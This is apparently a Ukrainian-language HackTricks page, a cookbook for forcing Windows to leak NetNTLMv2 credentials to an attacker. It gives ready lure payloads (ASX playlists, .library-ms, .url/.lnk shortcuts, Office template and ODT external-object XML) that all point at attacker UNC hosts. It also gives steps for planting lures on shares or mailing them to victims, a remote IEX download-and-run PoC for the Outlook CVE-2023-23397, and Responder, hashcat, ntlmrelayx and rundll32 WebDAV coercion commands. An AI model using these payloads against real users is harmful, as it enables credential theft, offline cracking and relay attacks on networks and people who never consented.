# Місця для викрадення облікових даних NTLM

{{#include ../../banners/hacktricks-training.md}}

**Перегляньте всі чудові ідеї: від завантаження онлайн-файлу Microsoft Word до джерела витоку NTLM: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) та https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md, а також [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Доступний для запису SMB share + UNC-приманки, що запускаються через Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Якщо ви можете **записувати у share, який користувачі або заплановані завдання переглядають в Explorer**, розмістіть файли, метадані яких вказують на ваш UNC (наприклад, `\\ATTACKER\share`). Відображення вмісту папки запускає **неявну SMB-автентифікацію** та передає **NetNTLMv2** вашому слухачу.<sup>[[1]](#references)</sup>

1. **Створіть приманки** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF тощо)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Розмістіть їх у спільній папці з правом запису** (у будь-якій папці, яку відкриває жертва):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Прослухати та crack**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows може звертатися до кількох файлів одночасно; для всього, що Провідник попередньо переглядає (`BROWSE TO FOLDER`), не потрібно нічого натискати.

### Плейлисти Windows Media Player (.ASX/.WAX)

Якщо вам вдасться змусити ціль відкрити або попередньо переглянути створений вами плейлист Windows Media Player, можна отримати leak Net‑NTLMv2, вказавши для запису UNC-шлях. WMP спробує отримати вказаний медіафайл через SMB і автентифікується автоматично.<sup>[[3]](#references)[[4]](#references)</sup>

Приклад payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Процес збору та зламу:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### NTLM leak через .library-ms, вбудований у ZIP (CVE-2025-24071/24055)

Windows Explorer небезпечно обробляє файли .library-ms, якщо їх відкривати безпосередньо з ZIP-архіву. Якщо визначення бібліотеки вказує на віддалений UNC-шлях (наприклад, \\attacker\share), простий перегляд/запуск файлу .library-ms усередині ZIP змушує Explorer опитувати UNC-шлях і надсилати атакувальнику дані автентифікації NTLM. У результаті можна отримати NetNTLMv2, який можна зламати офлайн або потенційно передати через relay.<sup>[[2]](#references)</sup>

Мінімальний .library-ms, що вказує на UNC атакувальника

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Операційні кроки
- Створіть файл .library-ms із наведеним вище XML (вкажіть свою IP-адресу/ім’я хоста).
- Заархівуйте його (у Windows: «Надіслати → Стиснута ZIP-папка») і надішліть ZIP цілі.
- Запустіть listener для перехоплення NTLM і дочекайтеся, поки жертва відкриє файл .library-ms з ZIP-архіву.


### Шлях до звукового файлу нагадування календаря Outlook (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook для Windows обробляв розширену властивість MAPI PidLidReminderFileParameter у елементах календаря. Якщо ця властивість вказувала на UNC-шлях (наприклад, \\attacker\share\alert.wav), Outlook під’єднувався до SMB-шари, коли спрацьовувало нагадування, спричиняючи leak Net-NTLMv2 користувача без жодного кліку. Цю вразливість виправили 14 березня 2023 року, але вона досі має велике значення для застарілих/неоновлених середовищ і під час ретроспективного реагування на інциденти.<sup>[[5]](#references)</sup>

Швидка експлуатація за допомогою PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

На боці слухача:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Нотатки
- Жертві достатньо, щоб Outlook для Windows був запущений у момент спрацювання нагадування.
- leak дає Net‑NTLMv2, придатний для офлайн-злому або relay (але не для pass-the-hash).


### .LNK/.URL zero-click NTLM leak на основі іконки (CVE‑2025‑50154 – обхід CVE‑2025‑24054)

Windows Explorer автоматично відображає іконки ярликів. Недавні дослідження показали, що навіть після квітневого патча Microsoft 2025 року для ярликів з UNC-іконками все ще можна було запустити автентифікацію NTLM без жодного кліку: для цього ціль ярлика потрібно було розмістити за UNC-шляхом, а іконку залишити локальною (обхід патча отримав позначення CVE‑2025‑50154). Достатньо просто переглянути папку, щоб Explorer отримав метадані з віддаленої цілі та надіслав NTLM на SMB-сервер атакувальника.<sup>[[6]](#references)</sup>

Мінімальне корисне навантаження Internet Shortcut (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Запрограмувати Shortcut payload (.lnk) за допомогою PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Ідеї для доставки
- Помістіть ярлик у ZIP-архів і спонукайте жертву відкрити його.
- Розмістіть ярлик на доступному для запису спільному ресурсі, який відкриє жертва.
- Додайте до тієї самої папки інші файли-приманки, щоб Провідник показував їхній попередній перегляд.

### No-click .LNK NTLM leak через шлях до значка ExtraData (CVE‑2026‑25185)

Windows завантажує метадані `.lnk` під час **перегляду/попереднього перегляду** (відображення значка), а не лише під час запуску. CVE‑2026‑25185 демонструє шлях обробки, за якого блоки **ExtraData** змушують оболонку визначати шлях до значка й звертатися до файлової системи **під час завантаження**, надсилаючи вихідний NTLM-запит, якщо шлях веде до віддаленого ресурсу.

Основні умови спрацювання (виявлені в `CShellLink::_LoadFromStream`):
- Додайте **DARWIN_PROPS** (`0xa0000006`) до ExtraData (умова для виклику процедури оновлення значка).
- Додайте **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) із заповненим полем **TargetUnicode**.
- Завантажувач розгортає змінні середовища в `TargetUnicode` і викликає `PathFileExistsW` для отриманого шляху.

Якщо `TargetUnicode` перетворюється на UNC-шлях (наприклад, `\\attacker\share\icon.ico`), **самого лише перегляду папки** з ярликом достатньо, щоб спричинити вихідну автентифікацію. Цей самий шлях завантаження може запускатися також під час **індексування** та **сканування антивірусом**, що створює практичну поверхню для no-click leak.<sup>[[7]](#references)</sup>

Інструменти для досліджень (парсер/генератор/інтерфейс) доступні в проєкті **LnkMeMaybe** — вони дають змогу створювати й перевіряти ці структури без графічного інтерфейсу Windows.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / перевірка облікових даних через `davclnt.dll,DavSetCookie`

Вбудований **клієнт WebDAV** можна використати, щоб примусити поточний сеанс входу пройти автентифікацію на довільній кінцевій точці **HTTP/WebDAV**:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Чому це корисно:
- На **контрольованому зловмисником WebDAV-сервері** це може ініціювати **NTLM через HTTP**, не запускаючи власний клієнт.
- На **внутрішніх хостах** це непомітний спосіб **перевірити, де приймають викрадені облікові дані**, перш ніж переходити до латерального переміщення.<sup>[[9]](#references)</sup>
- Ця команда — хороша альтернатива, коли вихідний **SMB-трафік фільтрується**, але **HTTP/WebDAV** усе ще доступний.

Практичні примітки:
- На вихідному хості має працювати служба **WebClient**.
- `rundll32.exe` завантажує `davclnt.dll` і доручає Windows виконати автентифікацію WebDAV з використанням **облікових даних поточного користувача**.<sup>[[10]](#references)</sup>
- Якщо вказуєте інфраструктуру під вашим контролем, використовуйте HTTP-слухач/ретранслятор, що підтримує NTLM, наприклад:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

З погляду виявлення, повторні запуски `rundll32.exe davclnt.dll,DavSetCookie` зі зверненнями до багатьох внутрішніх систем — це сильна ознака **перевірки облікових даних / підготовки до lateral movement, схожої на spray**, а не звичайної поведінки користувача.<sup>[[9]](#references)[[11]](#references)</sup>

### Віддалене впровадження шаблону Office (.docx/.dotm) для примусового надсилання NTLM

Документи Office можуть посилатися на зовнішній шаблон. Якщо вказати як прикріплений шаблон UNC-шлях, під час відкриття документа відбудеться автентифікація через SMB.

Мінімальні зміни зв’язків DOCX (у word/):

1) Відредагуйте word/settings.xml і додайте посилання на прикріплений шаблон:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Відредагуйте word/_rels/settings.xml.rels і вкажіть ваш UNC для rId1337:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Перепакуйте у `.docx` і передайте файл. Запустіть SMB-слухач для перехоплення автентифікації та дочекайтеся, поки файл відкриють.

### Зовнішній об’єкт ODT для SMB-автентифікації

Якщо шлях завантаження документів приймає `.odt`, але цільова система не відкриває файли Office `.docx`, використовуйте зовнішній об’єкт OpenDocument замість шаблону Office. `auxiliary/fileformat/odt_badodt` у Metasploit створює ODT, у якому `content.xml` містить посилання `draw:object`, що завантажується під час відкриття, як у прикладі нижче. Установіть `LHOST` на адресу SMB-слухача, завантажте ODT через дозволений процес і перехопіть відповідь NetNTLMv2, коли користувач або обробник документів відкриє файл. Перевірка розширення імені файлу не аналізує вбудовану URL-адресу; обмеження вхідної автентифікації NTLM у цільовій системі не обов’язково блокують вихідну автентифікацію.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Щоб дізнатися про способи relay або зловживання NTLM після capture, дивіться:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach — принади у writable share + capture за допомогою Responder → злам NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy — витік автентифікаційних даних через ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 до DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — витік NTLM через WMP → junction NTFS до webroot RCE → FullPowers + GodPotato до SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec — 5 вразливостей NTLM: невиправлені загрози підвищення привілеїв у Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC — Microsoft усуває EoP в Outlook (CVE‑2023‑23397) і пояснює витік NTLM через PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate — zero-click, один NTLM: обхід виправлення безпеки Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec — LnkMeMaybe: огляд CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Інструментарій TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 — коли телефонує IT-підтримка: аналіз кампанії ModeloRAT — від Teams до компрометації домену](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn — заголовок davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk — запит WebDAV через Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com — цікаві місця для викрадення хешів NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — capture NTLM через зовнішній об’єкт ODT](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
